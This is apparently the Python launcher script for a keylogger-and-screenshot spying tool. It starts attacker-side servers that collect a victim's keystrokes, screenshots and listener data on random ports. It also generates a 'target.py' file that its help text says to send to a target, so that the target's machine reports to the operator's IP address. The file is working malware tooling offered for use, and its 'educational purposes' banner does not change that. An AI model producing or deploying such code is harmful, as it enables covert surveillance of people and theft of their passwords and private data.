import KeyloggerScreenshot as ks
import sys
import threading
import random
import os

gui = """
    __ __              __                                 _____                                       __            __ 
   / //_/___   __  __ / /____   ____ _ ____ _ ___   _____/ ___/ _____ _____ ___   ___   ____   _____ / /_   ____   / /_
  / ,<  / _ \ / / / // // __ \ / __ `// __ `// _ \ / ___/\__ \ / ___// ___// _ \ / _ \ / __ \ / ___// __ \ / __ \ / __/
 / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /   ___/ // /__ / /   /  __//  __// / / /(__  )/ / / // /_/ // /_  
/_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
            /____/           /____/ /____/    
                                                                                     
                        ~Created by: Fawaz Bashiru~             
                        ~Write "python KLS_start.py -help" for help    
                        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES
                        SO DON'T USE THIS FOR EVIL ACTIVITIES
"""
print(gui)
lst = sys.argv

try:
    if "-aip" in lst: #"aip" stands for address ip
        idx = lst.index("-aip")
        try:
            ipaddress = str(lst[idx+1])
            zahlen = "123456789"
            nummer = 0
            port_numbers = []
            while nummer != 4:
                nummer += 1
                random_lst = "".join(random.sample(zahlen, 4))
                port_numbers.append(random_lst)

            port_photos = int(port_numbers[0])
            port_keylogger = int(port_numbers[1])
            port_listener = int(port_numbers[2])
            port_time = int(port_numbers[3])
            if "-ds" in lst:  # "ds" for demon server
                try:
                    server_code = f'''
import KeyloggerScreenshot as ks 
import threading

server_photos = ks.ServerPhotos("{ipaddress}", {port_photos})

server_keylogger = ks.ServerKeylogger("{ipaddress}", {port_keylogger})

server_listener = ks.ServerListener("{ipaddress}", {port_listener})

server_time = ks.Timer("{ipaddress}", {port_time})

threading_server = threading.Thread(target=server_photos.start)
threading_server.start()

threading_server2 = threading.Thread(target=server_keylogger.start)
threading_server2.start()

threading_server3 = threading.Thread(target=server_listener.start)
threading_server3.start()

threading_server4 = threading.Thread(target=server_time.start_timer)
threading_server4.start() '''

                    if os.path.exists("demon_server.py"):
                        os.remove("demon_server.py")
                    with open("demon_server.py", "a+") as file:
                        file.write(server_code)

                    print('"demon_server.py" HAS BEEN CREATED')
                except IndexError:
                    quit()
            if "-p" in lst: #"p" stands for ports
                idx_port = lst.index("-p")
                try:
                    print('ALL THE NUMBERS HAVE BEEN SAVED TO "ports.py"')
                    print(f"\nport_photos = {port_photos}\nport_keylogger = {port_keylogger}\nport_listener = {port_listener}\nport_time = {port_time}\n")
                    with open("ports.py", "a+") as file:
                        file.write(f"port_photos = {port_photos}\nport_keylogger = {port_keylogger}\nport_listener = {port_listener}\nport_time = {port_time}")

                except IndexError:
                    quit()

            if "-s" in lst: #"s" stands for seconds
                idx_s = lst.index("-s")
                try:
                    if "-" in lst[idx_s+1]:
                        print("PLEASE SPECIFY YOUR SECONDS -s")
                        quit()

                    seconds = int(lst[idx_s + 1])
                    if seconds < 60:
                        print(f"SECONDS MUST BE GREATER THAN 60")
                        quit()

                except IndexError:
                    seconds = 60
            else: seconds = 60

            if "-cf" in lst: #"cf" stands for Create file
                idx_cf = lst.index("-cf")
                try:
                    filename = lst[idx_cf + 1]
                    if not filename.endswith("py"):
                        data = filename.split(".")
                        filename = f"{data[0]}.py"
                    if "-" in filename:
                        filename = "target.py"

                    if os.path.exists(filename):
                        os.remove(filename)

                    with open(f"{filename}", "a+") as file:
                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener},ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
                    print(f"{filename.upper()} has been created")

                except IndexError:
                    with open("target.py", "a+") as file:
                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener},ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
                    print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")

            server_photos = ks.ServerPhotos(ipaddress, port_photos)

            server_keylogger = ks.ServerKeylogger(ipaddress, port_keylogger)

            server_listener = ks.ServerListener(ipaddress, port_listener)

            server_time = ks.Timer(ipaddress, port_time)

            threading_server = threading.Thread(target=server_photos.start)
            threading_server.start()

            threading_server2 = threading.Thread(target=server_keylogger.start)
            threading_server2.start()

            threading_server3 = threading.Thread(target=server_listener.start)
            threading_server3.start()

            threading_server4 = threading.Thread(target=server_time.start_timer)
            threading_server4.start()

        except IndexError:
            print("YOU FORGET TO INSERT YOUR IP")

    elif "-aip" not in lst and "-help" not in lst:
        print("PLEASE INSERT YOUR IP WITH -aip")

    if "-help" in lst:
        print("-aip INSERT THE SERVERS IP\n-s   SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET")

except OSError:
    print("CHECK YOUR IP-ADDRESS")
